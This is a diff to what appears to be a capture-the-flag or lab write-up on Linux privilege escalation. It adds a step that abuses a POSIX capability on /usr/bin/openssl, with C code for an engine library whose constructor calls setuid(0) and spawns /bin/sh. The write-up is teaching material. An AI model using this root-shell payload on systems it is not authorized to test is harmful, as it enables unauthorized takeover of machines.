@@ -98,6 +98,17 @@ Saving to: ‘LinEnum.sh’
 
 Now let's make it an executable file, by using _chmod +x LinEnum.sh_. Run LinEnum by using "./LinEnum.sh"
 
-After reading through LinEnum we find that _/usr/bin/openssl_ has POSIX capability.
+After reading through LinEnum we find that _/usr/bin/openssl_ has [POSIX](https://uwsgi-docs.readthedocs.io/en/latest/Capabilities.html) capability.
 ![image]({{0xtaylur.github.io}}/assets/openssl.png)
+
+After I bit of research I found a library load via OpenSSL using the C programming language. Create a C file named _engine.c_ and put this code block inside of it.
+```markdown
+#include <unistd.h>
+
+__attribute__((constructor))
+static void init() {
+    setuid(0);
+    execl("/bin/sh", "sh", NULL);
+}
+```
 
